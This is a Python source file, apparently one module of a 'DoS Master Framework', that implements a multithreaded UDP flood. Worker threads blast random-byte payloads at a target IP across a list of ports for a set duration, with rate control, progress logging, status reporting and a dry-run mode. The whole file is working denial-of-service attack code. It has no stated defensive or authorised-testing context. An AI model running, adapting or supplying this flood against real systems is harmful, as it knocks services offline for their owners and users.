#!/usr/bin/env python3
"""
DoS Master Framework - UDP Flood Attack Module
Professional UDP flood implementation
"""

import threading
import time
import socket
import random
from typing import Dict, Any, List
from datetime import datetime

class UDPFlood:
    """UDP flood attack implementation"""
    
    def __init__(self, config: Dict, logger):
        self.config = config
        self.logger = logger
        self.target = config['target']
        self.ports = config.get('ports', [53, 80, 123, 443])
        self.duration = config.get('duration', 60)
        self.threads = config.get('threads', 8)
        self.packet_size = config.get('payload_size', 1024)
        self.rate_limit = config.get('rate', 0)
        self.dry_run = config.get('dry_run', False)
        
        self.packets_sent = 0
        self.packets_failed = 0
        self.attack_active = False
        self.start_time = None
        self.worker_threads = []
        
    def validate_config(self) -> bool:
        """Validate attack configuration"""
        try:
            socket.inet_aton(self.target)
            
            if self.duration <= 0 or self.duration > 3600:
                self.logger.error("Duration must be between 1 and 3600 seconds")
                return False
                
            if self.threads <= 0 or self.threads > 100:
                self.logger.error("Threads must be between 1 and 100")
                return False
                
            if not self.ports or len(self.ports) == 0:
                self.logger.error("At least one port must be specified")
                return False
                
            for port in self.ports:
                if not (1 <= port <= 65535):
                    self.logger.error(f"Invalid port: {port}")
                    return False
            
            return True
            
        except socket.error:
            self.logger.error(f"Invalid target IP address: {self.target}")
            return False
    
    def execute(self) -> Dict[str, Any]:
        """Execute UDP flood attack"""
        self.logger.info(f"Starting UDP flood attack against {self.target}")
        
        if self.dry_run:
            return self._simulate_attack()
        
        self.attack_active = True
        self.start_time = time.time()
        
        try:
            # Start worker threads
            for i in range(self.threads):
                thread = threading.Thread(target=self._udp_worker, args=(i,))
                thread.start()
                self.worker_threads.append(thread)
                time.sleep(0.1)
            
            # Monitor attack progress
            self._monitor_attack()
            
            # Wait for all threads to complete
            for thread in self.worker_threads:
                thread.join()
            
            # Calculate results
            end_time = time.time()
            actual_duration = end_time - self.start_time
            avg_rate = self.packets_sent / actual_duration if actual_duration > 0 else 0
            
            result = {
                'attack_type': 'udp_flood',
                'target': self.target,
                'ports': self.ports,
                'duration': actual_duration,
                'packets_sent': self.packets_sent,
                'packets_failed': self.packets_failed,
                'success_rate': (self.packets_sent / (self.packets_sent + self.packets_failed)) * 100 if (self.packets_sent + self.packets_failed) > 0 else 0,
                'avg_rate': avg_rate,
                'threads_used': self.threads,
                'packet_size': self.packet_size,
                'timestamp': datetime.now().isoformat()
            }
            
            self.logger.info(f"UDP flood completed: {self.packets_sent} packets sent")
            return result
            
        except Exception as e:
            self.logger.error(f"UDP flood attack failed: {e}")
            raise
        finally:
            self.attack_active = False
    
    def _udp_worker(self, worker_id: int):
        """UDP flood worker thread"""
        self.logger.debug(f"UDP worker {worker_id} started")
        
        local_packets_sent = 0
        local_packets_failed = 0
        
        try:
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(self.packet_size)
            
            while self.attack_active and (time.time() - self.start_time) < self.duration:
                try:
                    # Select random port from list
                    port = random.choice(self.ports)
                    
                    # Send UDP packet
                    sock.sendto(payload, (self.target, port))
                    local_packets_sent += 1
                    
                    # Rate limiting
                    if self.rate_limit > 0:
                        delay = self.threads / self.rate_limit
                        time.sleep(delay)
                    else:
                        # Small delay to prevent system overload
                        time.sleep(0.001)
                    
                    # Batch update for performance
                    if local_packets_sent % 1000 == 0:
                        self.packets_sent += 1000
                        local_packets_sent = 0
                        
                except Exception as e:
                    local_packets_failed += 1
                    if local_packets_failed % 100 == 0:
                        self.logger.debug(f"Worker {worker_id}: {local_packets_failed} failed packets")
            
            # Final update
            self.packets_sent += local_packets_sent
            self.packets_failed += local_packets_failed
            sock.close()
            
        except Exception as e:
            self.logger.error(f"UDP worker {worker_id} failed: {e}")
            
        self.logger.debug(f"UDP worker {worker_id} completed")
    
    def _monitor_attack(self):
        """Monitor attack progress"""
        while self.attack_active:
            elapsed = time.time() - self.start_time if self.start_time else 0
            remaining = max(0, self.duration - elapsed)
            
            if elapsed > 0:
                current_rate = self.packets_sent / elapsed
                self.logger.info(f"UDP flood progress: {elapsed:.1f}s elapsed, "
                               f"{self.packets_sent} packets sent, "
                               f"{current_rate:.1f} pps, "
                               f"{remaining:.1f}s remaining")
            
            if remaining <= 0:
                self.attack_active = False
                break
                
            time.sleep(5)
    
    def _simulate_attack(self) -> Dict[str, Any]:
        """Simulate attack for dry-run mode"""
        self.logger.info("Simulating UDP flood attack (dry-run mode)")
        
        estimated_packets = self.threads * 2000 * self.duration
        time.sleep(2)
        
        return {
            'attack_type': 'udp_flood',
            'target': self.target,
            'ports': self.ports,
            'duration': self.duration,
            'packets_sent': estimated_packets,
            'packets_failed': 0,
            'success_rate': 100.0,
            'avg_rate': estimated_packets / self.duration,
            'threads_used': self.threads,
            'packet_size': self.packet_size,
            'timestamp': datetime.now().isoformat(),
            'dry_run': True
        }
    
    def stop(self):
        """Stop the attack"""
        self.logger.info("Stopping UDP flood attack")
        self.attack_active = False
    
    def get_status(self) -> Dict[str, Any]:
        """Get current attack status"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        current_rate = self.packets_sent / elapsed if elapsed > 0 else 0
        
        return {
            'attack_type': 'udp_flood',
            'active': self.attack_active,
            'elapsed_time': elapsed,
            'packets_sent': self.packets_sent,
            'current_rate': current_rate,
            'threads_active': len([t for t in self.worker_threads if t.is_alive()])
        }